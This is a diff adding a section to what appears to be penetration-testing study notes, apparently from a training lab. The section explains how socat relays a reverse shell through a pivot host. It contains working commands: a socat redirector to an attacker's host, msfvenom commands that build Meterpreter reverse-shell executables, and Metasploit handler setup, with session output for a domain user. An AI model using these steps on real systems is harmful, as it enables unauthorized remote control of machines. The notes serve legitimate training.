@@ -566,3 +566,69 @@ $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o b
 meterpreter > shell
 ```
 - **Meterpreter session** is opened after executing the payload.
+
+# **Socat Redirection with a Reverse Shell**
+
+#### **What is Socat?**
+- **Socat** is a powerful tool that acts as a bidirectional relay between two independent network connections.
+- It can:
+  - Redirect traffic from one host and port to another.
+  - Handle advanced setups like SSL, raw sockets, or Unix domain sockets.
+  - Create pipe-like connections between applications, replacing the need for more complex tunneling setups.
+
+#### **How is Socat Different from Normal Port Forwarding?**
+- **Normal Port Forwarding:**
+  - Typically handled by tools like SSH.
+  - Requires SSH access to the system performing the forwarding.
+  - Simpler but less flexible (e.g., may not handle different socket types or advanced configurations).
+
+- **Socat:**
+  - Does not require SSH; can operate independently on systems without SSH access.
+  - Offers advanced features, like working with different socket types (e.g., TCP, UDP, SSL, UNIX).
+  - Flexible configurations allow relaying, modifying, or interacting with network traffic more dynamically.
+
+---
+
+#### **Key Steps**
+
+1. **Set up Socat as a redirector:**
+   - Socat listens on a local port and forwards traffic to the attacker's host and port.
+   ```bash
+   socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+   ```
+   - **Explanation:** 
+     - `TCP4-LISTEN:8080` listens on port 8080.
+     - `fork` allows handling multiple simultaneous connections.
+     - `TCP4:10.10.14.18:80` forwards traffic to the attacker's host (`10.10.14.18`) on port 80.
+
+2. **Create a payload that connects to Socat:**
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+   ```
+   - **Payload details:** A reverse HTTPS payload connecting to `172.16.5.129:8080`.
+
+3. **Transfer the payload to the target (e.g., using SCP or SMB).**
+
+4. **Start Metasploit handler to catch the shell:**
+   - **Steps:**
+     ```bash
+     msfconsole
+     use exploit/multi/handler
+     set payload windows/x64/meterpreter/reverse_https
+     set lhost 0.0.0.0
+     set lport 80
+     run
+     ```
+   - **Explanation:** Listens on all interfaces (`0.0.0.0`) and port `80` for incoming connections from Socat.
+
+5. **Run the payload on the target host.**
+   - The payload sends a reverse shell connection to Socat (`172.16.5.129:8080`), which redirects it to the Metasploit listener (`10.10.14.18:80`).
+
+6. **Receive a Meterpreter session in Metasploit:**
+   ```plaintext
+   [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 )
+   meterpreter > getuid
+   Server username: INLANEFREIGHT\victor
+   ```
+
+---
